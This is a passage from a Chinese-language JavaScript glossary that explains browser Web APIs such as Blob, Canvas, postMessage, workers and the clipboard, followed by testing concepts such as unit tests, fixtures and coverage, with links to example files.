也见 [File & FileReader（文件对象与文件读取器）](#file-filereader文件对象与文件读取器)、[Object URL & Data URL（对象 URL 与 Data URL）](#object-url-data-url对象-url-与-data-url)。

示例：[`27_web_apis/11_blob_file_formdata.js`](27_web_apis/11_blob_file_formdata.js)、[`27_web_apis/11_blob_file_formdata.html`](27_web_apis/11_blob_file_formdata.html)

### File & FileReader（文件对象与文件读取器）

`File` 是**带名字与修改时间的 `Blob` 子类**，典型来源是 `<input type="file">` 的 `files`（一个 `FileList`）或拖放事件的 `dataTransfer.files`，因此可以直接当作 `fetch` 的 `body` 或 `FormData` 的值上传。`FileReader` 是把文件内容读进内存的传统方式，事件式 API：`readAsText`/`readAsDataURL`/`readAsArrayBuffer` 配合 `onload`/`onerror`/`onprogress`（可做进度条）。关键细节：现代代码更推荐 Blob 自带的 `file.text()`/`file.arrayBuffer()`（Promise 式，还能配合 `await`），`FileReader` 主要保留用于**进度监控与老环境兼容**；文件是**只读**的，且出于安全考虑 JS **拿不到完整本地路径**（只有文件名）。

也见 [Blob（二进制大对象）](#blob二进制大对象)、[FormData（表单数据）](#formdata表单数据)、[Drag and Drop & DataTransfer（拖放与数据传递）](#drag-and-drop-datatransfer拖放与数据传递)。

示例：[`27_web_apis/11_blob_file_formdata.js`](27_web_apis/11_blob_file_formdata.js)

### Object URL & Data URL（对象 URL 与 Data URL）

两者都是「把二进制内容变成一个可用的 URL」的方案，取舍完全不同。**对象 URL（`URL.createObjectURL(blob)`）**生成一个指向内存中 Blob 的 `blob:` 伪地址，**零拷贝、几乎瞬时**，适合预览大图片/视频、触发下载，但**必须手动 `URL.revokeObjectURL()` 释放**，否则只要文档还活着就一直占内存。**Data URL（`data:image/png;base64,...`）**把内容内联进 URL 字符串，自包含、可存进数据库或 CSS，但体积膨胀约 33%、有长度限制、不能用于大文件。**常见误解**：以为对象 URL 会被垃圾回收自动清理——规范上它绑定在文档上，长期不 revoke 是典型内存泄漏来源。

也见 [Blob（二进制大对象）](#blob二进制大对象)、[Canvas（画布）](#canvas画布)。

示例：[`27_web_apis/11_blob_file_formdata.js`](27_web_apis/11_blob_file_formdata.js)、[`27_web_apis/08_browser_modules.js`](27_web_apis/08_browser_modules.js)

### Canvas（画布）

`<canvas>` 是 HTML 里的一块**位图绘制区域**，通过 `canvas.getContext('2d')` 拿到 2D 上下文后就能画图：`fillRect`/`strokeRect`/`arc`/`beginPath`/`moveTo`/`lineTo`、`fillText`、`drawImage`、渐变与阴影、`save`/`restore` 管理状态、`translate`/`rotate`/`scale` 做变换。除了 2D 还有 `webgl`/`webgl2` 用于 3D。关键细节：Canvas 是**立即模式**——没有保留的对象模型，重画必须自己清空并重绘全部内容；分辨率由 `width`/`height` **属性**（不是 CSS 尺寸）决定，要处理 `devicePixelRatio` 才清晰；导出用 `canvas.toBlob()`/`toDataURL()`；**绘制到 Canvas 的跨域图片会污染（taint）画布**，之后导出会抛安全错误。

也见 [requestAnimationFrame（动画帧回调）](#requestanimationframe动画帧回调)、[Blob（二进制大对象）](#blob二进制大对象)。

示例：[`27_web_apis/07_canvas_basics.js`](27_web_apis/07_canvas_basics.js)、[`27_web_apis/07_canvas_basics.html`](27_web_apis/07_canvas_basics.html)

### requestAnimationFrame（动画帧回调）

`requestAnimationFrame(cb)` 把回调安排到**浏览器下一次重绘之前**执行，回调收到一个高精度时间戳；它是做动画的正确方式，返回的 id 可用 `cancelAnimationFrame` 取消。相比 `setInterval`，它的优势是：**与显示器刷新率对齐**（通常 60Hz，高刷屏更高）、**页面切到后台时自动暂停**（省电、避免积压）、时间戳让你的动画逻辑基于真实时间而非帧数（不同设备速度一致）。关键细节：**`setInterval(fn, 16)` 不是帧同步**，容易掉帧与抖动；动画循环里应避免读写布局属性造成强制同步布局。**常见误解**：以为它保证「每秒 60 次」——它保证的是「每次重绘前调用一次」，卡顿时帧率会掉，所以动画要用时间差推进。

也见 [Canvas（画布）](#canvas画布)、[IntersectionObserver（交叉观察器与懒加载）](#intersectionobserver交叉观察器与懒加载)。

示例：[`27_web_apis/07_canvas_basics.js`](27_web_apis/07_canvas_basics.js)、[`31_performance_and_memory/14_long_tasks_and_scheduling.js`](31_performance_and_memory/14_long_tasks_and_scheduling.js)

### IntersectionObserver（交叉观察器与懒加载）

`IntersectionObserver` 异步观察「**目标元素与视口（或某个根容器）是否相交**」，交叉比例变化时触发回调，条目里带 `isIntersecting`、`intersectionRatio`、`boundingClientRect`、`target`。它取代了「监听 `scroll` + `getBoundingClientRect()`」的旧做法：**不阻塞主线程、不需要在滚动回调里强制读布局**，因此不引起卡顿。典型用途：**图片/组件懒加载**（进入视口附近才加载，配 `rootMargin: '200px'` 提前触发）、**无限滚动**（底部哨兵元素进入视口就请求下一页）、曝光埋点、动画触发。关键细节：回调只在**跨越阈值**时触发，不是每帧都触发；用完记得 `disconnect()`。

也见 [MutationObserver & ResizeObserver（变动与尺寸观察器）](#mutationobserver-resizeobserver变动与尺寸观察器)、[requestAnimationFrame（动画帧回调）](#requestanimationframe动画帧回调)。

示例：[`27_web_apis/12_observer_apis.js`](27_web_apis/12_observer_apis.js)、[`27_web_apis/12_observer_apis.html`](27_web_apis/12_observer_apis.html)

### MutationObserver & ResizeObserver（变动与尺寸观察器）

`MutationObserver` 观察 **DOM 结构变化**（子节点增删、属性变化、文本变化），回调收到的 `MutationRecord` 列表描述「发生了什么」，`observe(target, { childList: true, subtree: true, attributes: true })` 配置观察范围——它是已废弃的 `Mutation Events` 的替代品，且回调在**微任务**里批量投递，不会打断当前操作。`ResizeObserver` 观察**元素的尺寸变化**（`contentRect`），用来替代 `window.onresize` 与「定时轮询尺寸」的旧方案，常用于容器自适应图表、虚拟列表重算。关键细节：**两者都在回调阶段读尺寸/结构，天然避免了强制同步布局**；`ResizeObserver` 回调里如果又改了被观察元素的尺寸，会触发 `ResizeObserver loop` 告警，需要避免自我触发的循环。

也见 [IntersectionObserver（交叉观察器与懒加载）](#intersectionobserver交叉观察器与懒加载)、[DOM Manipulation & DocumentFragment（DOM 操作与文档片段）](#dom-manipulation-documentfragmentdom-操作与文档片段)。

示例：[`27_web_apis/12_observer_apis.js`](27_web_apis/12_observer_apis.js)

### postMessage（跨上下文消息）

`postMessage` 是**跨上下文安全通信**的标准通道：窗口 ↔ iframe、窗口 ↔ 弹窗、页面 ↔ Web Worker ↔ Service Worker 之间都用它。发送方 `target.postMessage(message, targetOrigin)`，接收方 `addEventListener('message', e => e.data)` 并检查 `e.origin`/`e.source`。关键细节：消息内容经过**结构化克隆**（函数、DOM 节点、原型链会丢失或直接报错），因此不能传「行为」，只能传「数据」；**第二个参数 `targetOrigin` 绝不要写成 `'*'`**，否则消息可能被恶意页面截获，接收端**必须校验 `event.origin`**，这是常见的 XSS/数据泄露入口。**常见误解**：以为同源才能用——恰恰相反，它是跨源页面之间唯一被允许的通信方式。

也见 [BroadcastChannel（广播频道）](#broadcastchannel广播频道)、[Structured Clone（结构化克隆）](#structured-clone结构化克隆)、[Web Worker（浏览器端工作线程）](#web-worker浏览器端工作线程)。

示例：[`27_web_apis/13_cross_context_messaging.js`](27_web_apis/13_cross_context_messaging.js)、[`27_web_apis/13_cross_context_messaging.html`](27_web_apis/13_cross_context_messaging.html)

### BroadcastChannel（广播频道）

`BroadcastChannel` 让**同一源下的所有浏览上下文**（标签页、iframe、Worker）通过一个命名频道互相广播消息：`new BroadcastChannel('sync')` → `postMessage(data)` → 其它上下文触发 `onmessage`，`close()` 关闭。它比 `postMessage` 更简单——**不需要持有对方窗口的引用**，只要源相同、频道名相同就能收到，因此非常适合「多标签页状态同步」（登录/登出、主题切换、数据刷新、防止同一操作重复提交）。关键细节：消息同样走**结构化克隆**；**发送者自己不会收到自己发的消息**（这常常需要自己额外处理本地更新）；频道不跨源、也不跨浏览器。**常见误解**：以为它能替代服务器——它只在同一浏览器内传播，不同设备之间必须靠服务端（WebSocket/SSE）。

也见 [postMessage（跨上下文消息）](#postmessage跨上下文消息)、[storage Event（storage 事件）](#storage-eventstorage-事件)。

示例：[`27_web_apis/13_cross_context_messaging.js`](27_web_apis/13_cross_context_messaging.js)

### storage Event（storage 事件）

`window.addEventListener('storage', handler)` 监听的是「**其它同源上下文**修改了 localStorage/sessionStorage」这件事，事件对象的 `key`/`newValue`/`oldValue`/`url`/`storageArea` 描述改动内容。它的价值在于**零依赖实现跨标签页同步**（例如一个标签页退出登录，其它标签页立刻清空本地状态）。关键细节：**触发修改的那个标签页自己不会收到事件**（所以本地状态要单独更新）；`clear()` 会以 `key === null` 触发；`sessionStorage` 因为不跨标签页共享，实际上几乎用不到这个事件；另外它对**同一次改动只触发一次**，不会为每个 key 各来一次。

也见 [BroadcastChannel（广播频道）](#broadcastchannel广播频道)、[localStorage（本地存储）](#localstorage本地存储)。

示例：[`27_web_apis/05_web_storage.js`](27_web_apis/05_web_storage.js)、[`27_web_apis/13_cross_context_messaging.js`](27_web_apis/13_cross_context_messaging.js)

### Structured Clone（结构化克隆）

结构化克隆是浏览器与 Node 在**跨上下文传递数据**（`postMessage`、`history.pushState`、IndexedDB 存储、`MessageChannel`）时使用的序列化算法。它能处理对象与数组（含嵌套）、`Date`、`RegExp`、`Map`/`Set`、`ArrayBuffer`/TypedArray、`Blob`/`File`、`Error` 的常见类型，并且**正确保留循环引用**。它**不能**克隆：函数、DOM 节点、类实例的原型链（变成普通对象）、`Symbol`、属性描述符与 getter/setter。关键细节：`structuredClone(value)` 全局函数可以主动做一次深拷贝，是「比 `JSON.parse(JSON.stringify(x))` 更正确」的深拷贝方案。**常见误解**：以为传过去的是同一个对象——克隆就是**深拷贝**，改动副本不会影响原件（想共享内存必须用 `SharedArrayBuffer`）。

也见 [postMessage（跨上下文消息）](#postmessage跨上下文消息)、[SharedArrayBuffer（共享内存缓冲区）](#sharedarraybuffer共享内存缓冲区)，以及类型册的 [`24_typed_arrays/11_blob_and_binary_interop.js`](24_typed_arrays/11_blob_and_binary_interop.js)。

示例：[`27_web_apis/13_cross_context_messaging.js`](27_web_apis/13_cross_context_messaging.js)、[`27_web_apis/14_drag_drop_and_clipboard.js`](27_web_apis/14_drag_drop_and_clipboard.js)

### Drag and Drop & DataTransfer（拖放与数据传递）

HTML5 拖放基于一组事件：`dragstart`（在被拖元素上触发，此处必须调用 `dataTransfer.setData()` 才能启动拖拽）、`dragenter`/`dragover`（在放置目标上持续触发，**必须 `preventDefault()` 才会变成可放置**）、`drop`（读取 `dataTransfer.getData()`/`files`）、`dragend`，以及 `dragleave`。`dataTransfer` 是事件对象的属性，承载被拖数据与 `dropEffect`（复制/移动）、`effectAllowed`，并负责在页面之间传递文件（`dataTransfer.files`）。关键细节：拖拽过程中 `dataTransfer` 的数据**只能在 `drop` 时读取**（`dragstart` 之外读不到，是防跨站探测的安全设计）；支持自定义拖拽图像 `setDragImage`；移动端浏览器对 HTML5 拖放支持有限，常改用指针事件。

也见 [File & FileReader（文件对象与文件读取器）](#file-filereader文件对象与文件读取器)、[Clipboard API & User Gesture（剪贴板与用户手势）](#clipboard-api-user-gesture剪贴板与用户手势)。

示例：[`27_web_apis/14_drag_drop_and_clipboard.js`](27_web_apis/14_drag_drop_and_clipboard.js)、[`27_web_apis/14_drag_drop_and_clipboard.html`](27_web_apis/14_drag_drop_and_clipboard.html)

### Clipboard API & User Gesture（剪贴板与用户手势）

现代剪贴板 API 是 `navigator.clipboard`：`writeText`/`readText` 读写纯文本，`write`/`read` 用 `ClipboardItem` 处理 `text/html`、`image/png` 等富类型，全部返回 Promise。关键限制是**用户手势要求（user gesture）**：读写剪贴板必须在用户交互（点击、按键）触发的调用栈里发起，否则浏览器会拒绝（Permission denied）——粘贴读取的保护更严，通常还需用户授权。关键细节：`navigator.clipboard` **只在安全上下文（HTTPS/localhost）可用**，`file://` 与 `http://` 页面下它是 `undefined`，旧式 `document.execCommand('copy')` 因此仍作为降级方案保留；页面失焦（切到别的应用）时读写也会失败。

也见 [Secure Context & file://（安全上下文与 file 协议限制）](#secure-context-file安全上下文与-file-协议限制)、[Drag and Drop & DataTransfer（拖放与数据传递）](#drag-and-drop-datatransfer拖放与数据传递)。

示例：[`27_web_apis/14_drag_drop_and_clipboard.js`](27_web_apis/14_drag_drop_and_clipboard.js)

### Web Worker（浏览器端工作线程）

Web Worker 让页面拥有**额外的后台线程**，在主线程之外执行 JS，从而把耗时计算从渲染路径上挪开：`new Worker(url, { type: 'module' })` 创建，双向通过 `postMessage`/`onmessage` 通信（数据走结构化克隆），`worker.terminate()` 结束。限制非常明确：**Worker 里没有 `document`、没有 DOM，也没有 `window`**，只能访问 `self`、`fetch`、`IndexedDB`、`caches`、`WebSocket` 等；不能直接操作页面元素，只能把结果发回主线程渲染。关键细节：创建 Worker 需要**独立的脚本文件 URL**（不能直接传函数），跨源脚本需 CORS 允许；可用 `SharedArrayBuffer` 做到零拷贝共享内存，但需要跨源隔离（COOP/COEP）。**常见误解**：以为 Worker 能加速一切——通信本身有序列化成本，小任务反而更慢。

也见 [Worker Threads & Main Thread（工作线程与主线程）](#worker-threads-main-thread工作线程与主线程)、[postMessage（跨上下文消息）](#postmessage跨上下文消息)、[Service Worker（服务工作线程）](#service-worker服务工作线程)。

示例：[`27_web_apis/13_cross_context_messaging.js`](27_web_apis/13_cross_context_messaging.js)、[`27_web_apis/09_dom_performance.js`](27_web_apis/09_dom_performance.js)

### Service Worker（服务工作线程）

Service Worker 是**运行在页面之外、可拦截网络请求**的特殊 Worker，本质是一个「可编程的网络代理」：注册后可以拦截同源（作用域内）的 `fetch` 事件、从 Cache Storage 返回离线内容、做后台同步与推送通知。生命周期与普通 Worker 完全不同：`navigator.serviceWorker.register('/sw.js')` → 安装 `install` → 等待 `waiting` → 激活 `activate`，之后在**没有页面打开时也可能被唤醒或终止**，因此**不能依赖全局变量保存状态**。关键限制：**只在安全上下文可用**，作用域受脚本路径限制（`/sw.js` 才能控制整个站点），升级时要处理缓存版本与 `skipWaiting`/`clients.claim` 的更新时机。**常见误解**：以为它常驻内存——它是事件驱动的，随时会被浏览器回收。

也见 [Cache Storage（缓存存储）](#cache-storage缓存存储)、[Secure Context & file://（安全上下文与 file 协议限制）](#secure-context-file安全上下文与-file-协议限制)。

示例：[`27_web_apis/10_browser_storage_limits.js`](27_web_apis/10_browser_storage_limits.js)、[`27_web_apis/13_cross_context_messaging.js`](27_web_apis/13_cross_context_messaging.js)

### Secure Context & file://（安全上下文与 file 协议限制）

**安全上下文（secure context）**指页面通过 HTTPS（或 `localhost`、`127.0.0.1` 等被认定为「可能可信」的来源）加载；只有在这种环境下，一大批敏感 API 才存在：`navigator.clipboard`、`crypto.subtle`、`navigator.geolocation`、Service Worker、`navigator.storage.persist()`、`getUserMedia` 等。**`file://` 协议**是最容易踩坑的场景：直接双击打开 HTML 文件时，每个文件被视为**独立的不透明源**，于是 ESM 的 `import` 被 CORS 拦下、`fetch` 本地文件失败、`localStorage`/Cookie 行为不一致或被禁用、Service Worker 与剪贴板 API 不可用。关键细节：解决办法不是关掉安全策略，而是**起一个本地 HTTP 服务**（`npx serve`、`python -m http.server`）。**常见误解**：以为「浏览器把文件当同源」——它在很多实现里恰恰是**最严格**的隔离。

也见 [Same-Origin Policy & Cross-Origin（同源策略与跨域）](#same-origin-policy-cross-origin同源策略与跨域)、[CORS（跨域资源共享）](#cors跨域资源共享)、[Clipboard API & User Gesture（剪贴板与用户手势）](#clipboard-api-user-gesture剪贴板与用户手势)。

示例：[`27_web_apis/08_browser_modules.js`](27_web_apis/08_browser_modules.js)、[`27_web_apis/05_web_storage.js`](27_web_apis/05_web_storage.js)

---

## 测试

### Testing Pyramid（测试金字塔）

测试金字塔是「不同粒度的自动化测试各写多少」的经验分布模型：底层是数量最多、跑得最快的**单元测试**，中间是数量适中的**集成测试**，塔尖是数量最少、最慢也最脆弱的**端到端测试**。之所以是金字塔而不是倒三角，是因为越往上层跑一次的成本越高、失败原因越难定位、越容易因环境波动而随机失败；把验证重心压在单元层，才能既快又准地拿到反馈。关键细节：它描述的是**投入比例**而非「上层不重要」——用户真正感知到的价值恰恰在 E2E 层，所以实践中常配合「测试奖杯」（单元与集成占多数，E2E 少而精）使用；比例也不是教条，纯函数库可以几乎只有单元测试，而支付这类关键链路值得多写集成测试。

**常见误解**：把「单元测试数量必须多于 E2E」当成硬规定，或者把集成测试看作「跑得慢的单元测试」而整层省略。

也见 [Unit Test（单元测试）](#unit-test单元测试)、[Integration Test（集成测试）](#integration-test集成测试)、[End-to-End Test / E2E（端到端测试）](#end-to-end-test-e2e端到端测试)。

示例：[`28_testing/12_test_pyramid_and_e2e.js`](28_testing/12_test_pyramid_and_e2e.js)

### Unit Test（单元测试）

单元测试针对**一个最小的可验证单元**（通常是一个函数或一个类）做隔离验证，只关心「给定输入得到什么输出／抛什么错」，不启动服务器、不连数据库、不碰网络。它的价值在于**快**（毫秒级、可随文件保存实时跑）和**定位准**（红了就知道是哪个函数坏了）。关键细节：可测性最好的单元是**纯函数**——相同输入永远得到相同输出、不产生副作用，因此不需要任何测试替身即可断言；一旦函数内部直接 `fetch` 或读全局状态，就必须靠注入或 mock 才能测。写单元测试的重点不是覆盖率数字，而是覆盖**边界值**（0、空字符串、`null`、极大值）与**等价类**，因为 bug 几乎都藏在边界上。

**常见误解**：以为「调用了一个函数」就算单元测试——如果它顺带真的发出了网络请求，那已经是集成测试了。

也见 [Integration Test（集成测试）](#integration-test集成测试)、[Test Double（测试替身）](#test-double测试替身)、[Parameterized Test（参数化测试）](#parameterized-test参数化测试)。

示例：[`28_testing/07_testing_pure_functions.js`](28_testing/07_testing_pure_functions.js)

### Integration Test（集成测试）

集成测试验证**多个模块拼在一起**能否正常协作：路由 + 校验 + 业务逻辑 + 数据层、或者客户端代码与真实 HTTP 服务之间的契约。它牺牲了一部分速度和定位精度，换来的正是单元测试看不见的东西——**接线错误**（参数顺序错、字段名对不上、序列化格式不一致）。关键细节：集成测试的「集成」程度可以分级，最实用的一档是「用真实端口起一个服务，用真实请求打进去」，既避开了 mock 带来的「假通过」，又不用引入数据库等重资产；断言要落在**对外契约**（状态码、响应体结构、错误格式）上，而不是内部实现细节，否则重构时测试会成批碎掉。

**常见误解**：以为集成测试一定要连真实数据库或第三方服务——它只要求「多于一个单元」，起一个内存存储的真实 HTTP 服务就已经是合格的集成测试。

也见 [End-to-End Test / E2E（端到端测试）](#end-to-end-test-e2e端到端测试)、[Mock（模拟对象）](#mock模拟对象)。

示例：[`28_testing/14_testing_http.js`](28_testing/14_testing_http.js)、[`28_testing/12_test_pyramid_and_e2e.js`](28_testing/12_test_pyramid_and_e2e.js)

### End-to-End Test / E2E（端到端测试）

端到端测试从**用户视角**驱动整个系统：打开浏览器、点击、输入、等待，然后断言屏幕上出现了什么。它是最接近真实使用、最能给人信心的测试，也因此是最慢（分钟级）、最脆弱（网络抖动、动画时序、第三方依赖都会让它随机失败）、最难定位（红了只说明「某一环坏了」）的一层。关键细节：E2E 应该只覆盖**关键业务流程**（登录、下单、支付这类「坏了就是事故」的路径），并且要刻意避开对像素和绝对时序的断言——等待元素出现而不是等待固定毫秒数，是让 E2E 稳定的第一原则。

**常见误解**：以为 E2E 越多越安全。实际上大量脆弱的 E2E 会拖慢流水线、消耗团队对红灯的信任，最终被集体忽略，反而比没有测试更糟。

也见 [Testing Pyramid（测试金字塔）](#testing-pyramid测试金字塔)、[Flaky Test（不稳定测试）](#flaky-test不稳定测试)。

示例：[`28_testing/12_test_pyramid_and_e2e.js`](28_testing/12_test_pyramid_and_e2e.js)

### Smoke Test（冒烟测试）

冒烟测试是一组**极短、只回答「系统还能不能启动」**的检查：进程能否起来、首页能否返回 200、关键依赖能否连上。名字来源于硬件通电看是否冒烟。它不验证业务正确性，只做「部署后第一道闸门」，目的是在几十秒内把「这次发布整个是坏的」挡下来，而不是等 E2E 跑完十分钟才发现。关键细节：冒烟测试通常跑在**构建产物**上而不只是源码（源码能跑不代表打包后能跑），并且在流水线里位于「部署到预发之后、放全量流量之前」这个位置。

**常见误解**：把冒烟测试和「快速回归测试」混为一谈——前者的判据是「活没活」，后者的判据是「对不对」。

也见 [Regression Test（回归测试）](#regression-test回归测试)、[Testing Pyramid（测试金字塔）](#testing-pyramid测试金字塔)。

示例：[`39_tooling_and_workflow/07_lockfile_and_ci.js`](39_tooling_and_workflow/07_lockfile_and_ci.js)

### Test Case（测试用例）

测试用例是**一条独立的、有明确预期的验证单元**：给定前置条件、执行某个操作、断言某个结果。一条好的用例只验证一件事，名字要能当文档读（`空数组时返回 0 而不是抛错`），失败信息要足以让人不看代码就知道哪里不对。关键细节：用例之间必须彼此独立——「用例 A 先跑，用例 B 才能过」是测试套件里最隐蔽的债务，因为一旦并行执行或单独重跑就会神秘失败。

**常见误解**：以为 `test('测试一下登录')` 里塞进十个断言是「省事」。一旦第一个断言失败，后面的信息全部丢失，定位成本反而更高。

也见 [Test Suite（测试套件）](#test-suite测试套件)、[Test Isolation（测试隔离）](#test-isolation测试隔离)。

示例：[`28_testing/04_test_structure.js`](28_testing/04_test_structure.js)

### Test Suite（测试套件）

测试套件是**一组被组织在一起、一起运行的测试用例**，通常对应一个文件、一个模块或一个 `describe` 分组。套件不仅是收纳盒，它还携带共享的前置与清理逻辑（`beforeEach`/`afterAll`），并且是「单独跑一个文件」的最小单位——排查问题时先缩小到某个套件，再缩小到某条用例。关键细节：套件的划分应当与**被测代码的边界**一致（一个模块一个套件），这样「哪个套件红了」本身就是一条定位信息。

**常见误解**：把「套件」等同于「测试运行器」——套件是内容的组织单位，运行器是执行它的工具。

也见 [Test Case（测试用例）](#test-case测试用例)、[Test Runner（测试运行器）](#test-runner测试运行器)。

示例：[`28_testing/04_test_structure.js`](28_testing/04_test_structure.js)

### Assertion（断言）

断言是测试里**把「实际值」和「期望值」对比的那一句**：不成立就抛错，让用例失败。`node:assert` 提供了一组语义精确的方法：`strictEqual`（`Object.is` 语义，不做类型转换）、`deepStrictEqual`（递归比较结构与原型）、`throws`/`rejects`（断言会抛错或拒绝）、`ok`（真值判断）、`match`（正则匹配）。关键细节：**选错断言方法会造成假通过**——用 `==` 语义的相等断言比较 `'1'` 与 `1` 会通过，用 `deepEqual` 而不是 `deepStrictEqual` 可能放过类型错误；`.rejects` 必须 `await`（或 `return`），否则断言还没执行测试就已经算通过了。

**常见误解**：以为断言越多越好。断言应聚焦于可观察行为，把「实现细节」写进断言会让重构变成改测试。

也见 [Test Case（测试用例）](#test-case测试用例)、[Vitest（Vitest 与 Jest）](#vitestvitest-与-jest)。

示例：[`28_testing/03_assert_module.js`](28_testing/03_assert_module.js)

### Test Runner（测试运行器）

测试运行器是**负责发现、执行、汇总测试并决定进程退出码**的工具：它扫描测试文件、按结构逐个执行用例、捕获失败与超时、打印报告，最后以非零退出码告诉你「有没有挂」——这个退出码正是流水线判断成败的依据。关键细节：运行器通常还提供筛选（只跑名字匹配的用例）、并发、watch 模式、覆盖率集成与生命周期钩子；JS 生态里常见的运行器有 Node 内置的 `node:test`、Vitest、Jest、Mocha（需搭配断言库）等。

**常见误解**：把「断言库」和「运行器」混为一谈——`node:assert` 只会抛错，是运行器把它捕获并汇报成「一条失败的用例」。

也见 [node:test（Node 内置测试运行器）](#nodetestnode-内置测试运行器)、[Vitest（Vitest 与 Jest）](#vitestvitest-与-jest)、[Assertion（断言）](#assertion断言)。

示例：[`28_testing/02_node_test_runner.js`](28_testing/02_node_test_runner.js)

### node:test（Node 内置测试运行器）

`node:test` 是 Node.js 自带的测试运行器模块，**零依赖**即可写测试：`import { test } from 'node:test'`，用 `test()` 定义用例、`t.test()` 定义子测试、`describe`/`it` 分组，跑 `node --test` 自动发现文件。关键细节：它与 `node:assert` 天然配套，支持 `mock` 子模块、`--experimental-test-coverage` 覆盖率、并发与超时；优点是**不必为一个 hello world 装 200MB 的 node_modules**，缺点是生态（快照、浏览器环境、DOM 断言）不如 Vitest/Jest 丰富。本仓库之所以能在只有少量依赖的前提下演示测试，正是因为它。

**常见误解**：以为「内置 = 玩具」。`node:test` 的 API 已足以支撑生产项目，只是缺少前端组件测试这类专用能力。

也见 [Test Runner（测试运行器）](#test-runner测试运行器)、[Test Double（测试替身）](#test-double测试替身)。

示例：[`28_testing/02_node_test_runner.js`](28_testing/02_node_test_runner.js)

### Vitest（Vitest 与 Jest）

Vitest 与 Jest 是功能完备的**测试框架**（运行器 + 断言 + 替身 + 覆盖率一体）：共享 `describe`/`it`/`expect`/`beforeEach` 这套描述风格，提供 `vi.fn()`/`jest.fn()` 造替身、`vi.mock()` 做模块级 mock、`toMatchSnapshot()` 做快照、`--coverage` 出覆盖率报告。关键差异：Jest 历史悠久、生态与文档最厚，自带 jsdom 环境；Vitest 复用 Vite 的转换与依赖图，启动与 watch 更快、原生 ESM/TS 无痛，API 基本兼容 Jest。关键细节：本仓库只把 Vitest 作为 devDependency 用于**演示其 API 风格**，实际示例统一跑在 `node:test` 上，这样 `npm run check` 不需要额外的测试框架即可执行。

**常见误解**：以为「装了 Jest 就能测一切」——它们默认跑在 Node 环境，测 DOM 需要额外配置 `jsdom`/`environment`。

也见 [Assertion（断言）](#assertion断言)、[Snapshot Testing（快照测试）](#snapshot-testing快照测试)、[node:test（Node 内置测试运行器）](#nodetestnode-内置测试运行器)。

示例：[`28_testing/10_vitest_intro.js`](28_testing/10_vitest_intro.js)

### Test Isolation（测试隔离）

测试隔离要求**每条用例都在干净、可预测的状态下开始**，不依赖其它用例留下的数据、全局变量、模块缓存或执行顺序。它之所以重要，是因为「顺序依赖」的测试套件一旦并行化、被随机排序或单独重跑就会莫名其妙地红，而这类失败的排查成本极高。关键细节：隔离需要主动清理——每个用例的 `beforeEach` 重建状态、用例结束后还原被替换的替身与被修改的全局对象（`t.after`/`afterEach` 是常见位置）；模块级的可变状态（单例、缓存）是最容易泄漏的一类。

**常见误解**：以为「我只改了一个局部变量所以不用清理」——模块单例、`Date.now`、`Math.random`、环境变量都是跨用例的共享状态，必须显式恢复。

也见 [Setup / Teardown（测试前置与后置）](#setup-teardown测试前置与后置)、[Flaky Test（不稳定测试）](#flaky-test不稳定测试)。

示例：[`28_testing/04_test_structure.js`](28_testing/04_test_structure.js)

### Setup / Teardown（测试前置与后置）

Setup 与 teardown 是运行器提供的**生命周期钩子**：`before`/`beforeEach` 在测试（或每个测试）之前准备环境，`after`/`afterEach` 之后清理现场，作用域由它们所在的分组（套件或文件）决定。核心原则是「**谁申请，谁释放**」：在 `before` 里起的服务、开的文件、建的连接，必须在 `after` 里关掉，否则进程可能挂住不退出。关键细节：`beforeEach` 提供的是「每条用例都全新的状态」，天然满足隔离要求，但代价是重复开销——因此「只读的昂贵准备」放 `before`，「会被修改的状态」放 `beforeEach`。

**常见误解**：以为 `after` 只在成功时执行。用 `try/finally` 或运行器的钩子语义可以保证失败路径也清理，否则一次失败会污染后续用例。

也见 [Test Isolation（测试隔离）](#test-isolation测试隔离)、[Fixture（夹具）](#fixture夹具)。

示例：[`28_testing/04_test_structure.js`](28_testing/04_test_structure.js)

### Fixture（夹具）

夹具是**测试所依赖的固定数据或固定环境**：一组预置的用户记录、一个临时目录、一份已知内容的配置文件。夹具的作用是让「输入」成为常量，从而让「输出」可被断言；它可以是内联的字面量、抽出的工厂函数（`makeUser({ role: 'admin' })`），或从外部加载的数据文件。关键细节：夹具应当**偏向工厂函数而不是共享常量对象**——共享对象会被某个用例意外修改，造成跨用例污染；工厂每次返回新实例，天然隔离。

**常见误解**：以为夹具越「真实」（比如导出生产数据库的一份快照）越好。过大、过真的夹具会让测试难以理解也难维护，且一旦数据结构变化就要全量返工。

也见 [Setup / Teardown（测试前置与后置）](#setup-teardown测试前置与后置)、[Test Isolation（测试隔离）](#test-isolation测试隔离)。

示例：[`28_testing/04_test_structure.js`](28_testing/04_test_structure.js)

### Parameterized Test（参数化测试）

参数化测试用**一张「输入 → 期望输出」的表**驱动同一条断言逻辑，为每一行生成一个独立用例。它把「三条几乎一样的测试」压缩成一份数据，新增用例只是加一行，而且失败信息会指明是哪一组数据挂了。关键细节：表里要显式包含**边界值**（0、空字符串、`null`、`NaN`、极大值）和**非法输入**（应当抛错的情况，可用 `throws` 单独处理）；数据驱动测试的可读性依赖命名，用对象数组 `{ input, expected, desc }` 比纯二维数组更清楚。

**常见误解**：以为参数化只是「少打字」。它真正的收益是把「容易漏掉的边界情况」变成一份可审查的清单——漏了哪个边界，一眼就能从表里看出来。

也见 [Unit Test（单元测试）](#unit-test单元测试)、[Test Case（测试用例）](#test-case测试用例)。

示例：[`28_testing/07_testing_pure_functions.js`](28_testing/07_testing_pure_functions.js)

### Test Coverage（测试覆盖率）

覆盖率衡量**测试执行到了多少代码**，通常分四个口径：**语句覆盖**（多少条语句被执行）、**分支覆盖**（每个 `if`/`switch`/`?:`/`&&` 的两个方向是否都走到）、**函数覆盖**（多少函数被调用过）、**行覆盖**（源码多少行被执行）。它由运行器在代码里插桩统计得出，可以直观指出「哪些代码从来没被测过」。关键细节：覆盖率是**下限指标而非目标**——100% 覆盖不代表正确（断言可能很弱、可能只是把所有分支跑了一遍却没检查结果），而覆盖率低几乎是确定的信号；分支覆盖比语句覆盖更能暴露「只测了 happy path」。

**常见误解**：把覆盖率当 KPI 追求数字。一旦如此，团队会写出「执行代码但不做有效断言」的测试来刷指标，指标涨了而质量没涨。

也见 [Branch Coverage（分支覆盖率）](#branch-coverage分支覆盖率)、[Assertion（断言）](#assertion断言)。

示例：[`28_testing/08_test_coverage_concept.js`](28_testing/08_test_coverage_concept.js)

### Branch Coverage（分支覆盖率）

